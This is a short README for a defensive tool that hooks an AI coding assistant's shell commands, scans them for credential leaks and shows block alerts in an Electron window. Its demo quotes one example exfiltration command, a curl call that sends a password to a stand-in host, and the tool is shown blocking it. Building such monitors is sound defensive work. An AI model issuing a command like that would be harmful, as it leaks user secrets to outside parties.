# pipelock-ui

Real-time DLP monitor for AI coding assistants (Cursor, Claude Code).

Built on [pipelock](https://github.com/luckyPipewrench/pipelock) — intercepts 
agent shell commands before execution, scans for credential leaks, and displays 
live alerts in an Electron UI.

## What it does

- Intercepts Cursor agent commands via `beforeShellExecution` hooks
- Scans every command through pipelock's DLP engine
- Custom rules: Aadhaar numbers, SSNs, passwords, API tokens
- Live activity feed shows BLOCKED/ALLOWED/WARNING in real time

## Demo

Cursor tries to run: curl "https://test.com/?password=123" 
pipelock intercepts → blocks → UI shows `[CURSOR BLOCKED]` instantly.

## Setup (Windows)

1. Install [pipelock](https://github.com/luckyPipewrench/pipelock)
2. Copy `hook-fire.ps1` to `C:\Users\<you>\.cursor\`
3. Add `hooks.json` to `.cursor/` (see file for config)
4. `npm install && npm start`

## Stack

- Electron (single HTML file renderer)
- pipelock v0.1.4 (Go binary)
- PowerShell hook script
- JSON-based custom rule engine
